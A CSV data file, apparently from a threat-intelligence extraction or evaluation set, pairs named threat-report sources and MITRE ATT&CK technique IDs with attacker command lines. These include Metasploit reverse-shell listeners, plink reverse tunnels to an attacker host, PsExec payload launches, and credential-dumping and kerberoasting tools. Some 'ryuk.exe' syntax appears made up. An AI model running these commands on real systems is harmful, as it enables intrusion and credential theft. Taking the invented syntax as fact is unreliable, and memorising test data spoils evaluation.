SENTINELONE_FIN7,command_adfind_TA0007_T1482.txt,adfind,"adfind -b <basedn> -f ""(objectcategory=group)(|!(name=*Domain Group))"" -a dn","adfind -f ""(objectcategory=group)""`","45,681",True
SENTINELONE_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","64,495",True
SENTINELONE_FIN7,command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords -p <local_app_chrome_directory>\User Data\Default\Cookies.db,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","25,753",True
SENTINELONE_FIN7,command_plink_TA0011_T1071.txt,plink,plink.exe -ssh <attacker_ssh_user>@<cdn_domain> -P 443,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","48,477",True
SENTINELONE_FIN7,command_psexec_TA0007_T1057.txt,psexec,psexec \\* -u <username> -p <password> -d cmd /c tasklist,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","21,939",True
SENTINELONE_FIN7,command_ryuk_TA0005_T1497.txt,ryuk,ryuk --check-sandbox <drive_size>,`ryuk.exe --encrypt --process-name notepad.exe`,"13,565",True
SENTINELONE_FIN7,command_ryuk_TA0007_T1497.txt,ryuk,ryuk.exe --check-sandbox,`ryuk.exe --encrypt --process-name notepad.exe`,"36,171",True
SENTINELONE_FIN7,command_wmic_TA0007_T1082.txt,wmic,wmic os get /value,"`wmic /node:#{""POS system""} process call create #{""executable""}`","14,492",True
TALOS_FIN7,command_ryuk_TA0004_T1055.txt,ryuk,ryuk.exe --inject <dll_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"36,043",True
THREATDOWN_OILRIG,command_chrome_passwords_TA0001_T1204.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","60,523",True
THREATDOWN_OILRIG,command_ryuk_TA0011_T1105.txt,ryuk,ryuk.exe --drop-bat-files,`ryuk.exe --encrypt --process-name notepad.exe`,"36,908",True
THREATPOST_CARBANAK,command_chrome_passwords_TA0006_T1555.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","64,495",True
THREATPOST_CARBANAK,command_metasploit_TA0042_T1587.txt,metasploit,set payload windows/meterpreter/reverse_tcp,"```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```","63,966",True
THREATPOST_CARBANAK,command_plink_TA0011_T1219.txt,plink,plink.exe -i <attacker_ssh_private_key> root@<target_machine_IP> -R 3389:localhost:3389,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","50,97",True
THREATPOST_CARBANAK,command_ryuk_TA0002_T1204.txt,ryuk,ryuk.exe -e --drop-bat-files,`ryuk.exe --encrypt --process-name notepad.exe`,"34,525",True
THREATPOST_CARBANAK,command_ryuk_TA0009_T1113.txt,ryuk,ryuk.exe /capture,`ryuk.exe --encrypt --process-name notepad.exe`,"33,714",True
TRENDMICRO_WIZARDSPIDER,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","64,495",True
TRENDMICRO_WIZARDSPIDER,command_windows_credential_editor_TA0006_T1003.txt,windows credential editor,wce -e,"```sh
wce.exe -w
```","26,71",True
TRUSTWAVE1_CARBANAK,command_pupy_TA0003_T1053.txt,pupy,"pupysh.py --bg schedule_task --type at --minutes <minutes> --command ""tasklist /V""",`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"12,458",True
TRUSTWAVE1_CARBANAK,command_rubeus_TA0005_T1112.txt,rubeus,Rubeus.exe logonsession,`rubeus.exe kerberoast /domain:oz.local`,"34,217",True
TRUSTWAVE1_CARBANAK,command_ryuk_TA0003_T1547.txt,ryuk,ryuk.exe --drop-bat-files,`ryuk.exe --encrypt --process-name notepad.exe`,"36,908",True
TRUSTWAVE2_CARBANAK,command_ryuk_TA0004_T1055.txt,ryuk,ryuk.exe --inject-code-into-process=<target_process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"33,707",True
TRUSTWAVE3_CARBANAK,command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","60,523",True
TRUSTWAVE3_CARBANAK,command_rubeus_TA0003_T1543.txt,rubeus,rubeus harvest /targetuser:<scheduled_task_user> /interval:10,`rubeus.exe kerberoast /domain:oz.local`,"15,388",True
TRUSTWAVE3_CARBANAK,command_ryuk_TA0004_T1055.txt,ryuk,ryuk.exe --inject <dll_name> --process <target_process>,`ryuk.exe --encrypt --process-name notepad.exe`,"36,963",True
TRUSTWAVE3_CARBANAK,command_ryuk_TA0005_T1055.txt,ryuk,ryuk.exe /inject <dll_name> <process_id>,`ryuk.exe --encrypt --process-name notepad.exe`,"34,094",True
TRUSTWAVE3_CARBANAK,command_ryuk_TA0009_T1022.txt,ryuk,ryuk.exe --encrypt-all <directory_path>,`ryuk.exe --encrypt --process-name notepad.exe`,"47,399",True
TRUSTWAVE3_CARBANAK,command_ryuk_TA0010_T1041.txt,ryuk,ryuk.exe -e,`ryuk.exe --encrypt --process-name notepad.exe`,"47,11",True
UkrainianCriticalInfrastructure_SANDWORM,command_psexec_TA0008_T1021.txt,psexec,psexec.exe -u <user_name> -p <password> -r telnet,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","21,404",True
UkrainianCriticalInfrastructure_SANDWORM,command_ryuk_TA0040_T1529.txt,ryuk,ryuk.exe /shutdown,`ryuk.exe --encrypt --process-name notepad.exe`,"30,861",True
UNIT42_1_OILRIG,command_plink_TA0011_T1071.txt,plink,plink.exe -C -i <private_key_file> -hostkey <host_key_id> <attacker_ssh_user>@<remote_host>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","36,165",True
UNIT42_1_OILRIG,command_ryuk_TA0003_T1505.txt,ryuk,ryuk.exe -- persistence <persistence_script_path>,`ryuk.exe --encrypt --process-name notepad.exe`,"28,709",True
UNIT42_1_OILRIG,command_windows_credential_editor_TA0006_T1003.txt,windows credential editor,wce -w,"```sh
wce.exe -w
```","33,601",True
VISA_FIN6,command_adfind_TA0007_T1087.txt,adfind,"adfind -f ""(objectcategory=computer)""","adfind -f ""(objectcategory=group)""`","73,395",True
VISA_FIN6,command_metasploit_TA0003_T1505.txt,metasploit,msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.0.1; set LPORT 443; run',"```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```","52,184",True
VISA_FIN6,command_metasploit_TA0004_T1068.txt,metasploit,msfconsole,`sudo msfconsole`,"85,851",True
VISA_FIN6,command_metasploit_TA0011_T1219.txt,metasploit,meterpreter > shell,`meterpreter > load powershell`,"70,528",True
VISA_FIN6,command_psexec_TA0002_T1106.txt,psexec,"psexec \\remote_system -u domain\username -p password osql.exe -S <SQL_Server_Instance> -Q ""SELECT * FROM database.table""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","24,649",True
VISA_FIN6,command_windows_credential_editor_TA0009_T1213.txt,windows credential editor,windows-credential-editor -w,"```sh
wce.exe -w
```","6,028",True
